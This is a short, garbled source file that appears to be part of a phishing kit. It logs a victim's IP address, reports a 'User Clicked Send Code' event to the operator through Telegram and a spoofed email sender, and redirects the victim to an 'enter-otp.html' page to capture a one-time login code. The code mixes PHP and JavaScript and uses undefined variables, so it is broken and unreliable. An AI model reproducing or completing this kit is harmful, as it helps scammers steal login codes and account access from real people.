const email = require("email.js");
const config = require("config.js");

//Server Variables
const ip = process.env.REMOTE_ADDR;

//Name Attributes of HTML FORM
//Fetching HTML Values
const page = $_GET['page']; // should be sanitized and you can use REQUEST for either
const serv = $_REQUEST['__RequestVerificationToken'];
const sender_name = "EM6L3M";
const sender_mail = "em6l3m-light.log";

//Main Content
const main_subject = "User Clicked Send Code l " + ip;
const main_body = "<p></p>\nLogin Code sent Succesfully\nUser-Ip : " + ip + "\nDate : " + DATE;

send_telegram_msg(message);
const retval = email.send(server_mail, message, main_subject, uid + "\r\n \r\n\r\n " + main_body + "\r\n\r\n--" + uid + "\r\n " + uid, "From: " + sender_name + " <" + sender_mail + ">\r\nReply-To: " + sender_mail + "\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"" + uid + "\"\r\n\r\n");

//Output
window.location.href = "enter-otp.html";
